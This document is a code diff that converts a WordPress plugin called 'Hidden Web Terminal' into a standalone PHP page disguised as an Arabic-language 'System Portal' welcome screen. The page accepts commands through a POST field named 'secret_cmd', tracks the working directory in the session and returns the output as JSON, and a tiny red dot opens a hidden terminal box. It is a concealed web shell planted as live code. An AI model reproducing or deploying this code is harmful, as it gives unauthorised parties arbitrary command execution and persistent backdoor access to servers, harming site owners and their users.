@@ -1,17 +1,7 @@
 <?php
-/**
- * Plugin Name: Hidden Web Terminal
- * Description: Secret terminal widget for admin panel.
- * Version: 2.0
- * Author: VitAn
- */
-
-// Backend: Handle command execution via AJAX/POST
 if (isset($_POST['secret_cmd'])) {
     @session_start();
-    if(!isset($_SESSION['cwd'])) {
-        $_SESSION['cwd'] = ABSPATH;
-    }
+    if(!isset($_SESSION['cwd'])) { $_SESSION['cwd'] = getcwd(); }
     $cmd = $_POST['secret_cmd'];
     if(substr(trim($cmd), 0, 3) === 'cd ') {
         $target_dir = trim(substr($cmd, 3));
@@ -26,14 +16,22 @@ if (isset($_POST['secret_cmd'])) {
     echo json_encode(['output' => $output, 'cwd' => $_SESSION['cwd']]);
     exit();
 }
+?>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>System Portal</title>
+</head>
+<body style="background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:100px;">
+    <h2>مرحباً بك</h2>
 
-// Frontend: Inject the red button and terminal UI into WordPress admin pages
-add_action('admin_footer', function() {
-    ?>
-    <div id="secret-term-btn" style="position:fixed; bottom:20px; right:20px; width:20px; height:20px; background:red; border-radius:50%; cursor:pointer; z-index:999999; box-shadow:0 0 10px rgba(0,0,0,0.5);" title="Terminal"></div>
+    <!-- زر التيرمينال الأحمر -->
+    <div id="secret-term-btn" style="position:fixed; bottom:20px; right:20px; width:20px; height:20px; background:red; border-radius:50%; cursor:pointer; z-index:999999; box-shadow:0 0 10px rgba(255,0,0,0.5);" title="Terminal"></div>
     
-    <div id="secret-term-box" style="display:none; position:fixed; bottom:50px; right:20px; width:600px; height:400px; background:#111; color:#0f0; font-family:monospace; border:2px solid red; z-index:999999; padding:10px; box-shadow:0 0 20px rgba(0,0,0,0.8); flex-direction:column;">
-        <div id="term-header" style="background:#222; padding:5px; cursor:move; display:flex; justify-content:space-between; border-bottom:1px solid #444;">
+    <!-- صندوق التيرمينال -->
+    <div id="secret-term-box" style="display:none; position:fixed; bottom:50px; right:20px; width:600px; height:400px; background:#111; color:#0f0; font-family:monospace; border:2px solid red; z-index:999999; padding:10px; box-shadow:0 0 20px rgba(0,0,0,0.8); flex-direction:column; text-align:left;">
+        <div id="term-header" style="background:#222; padding:5px; display:flex; justify-content:space-between; border-bottom:1px solid #444;">
             <span id="term-cwd" style="font-size:12px; color:#ff5555;">/</span>
             <span id="term-close" style="cursor:pointer; color:#fff; font-weight:bold; padding:0 5px;">[X]</span>
         </div>
@@ -81,5 +79,5 @@ add_action('admin_footer', function() {
         }
     });
     </script>
-    <?php
-});
+</body>
+</html>
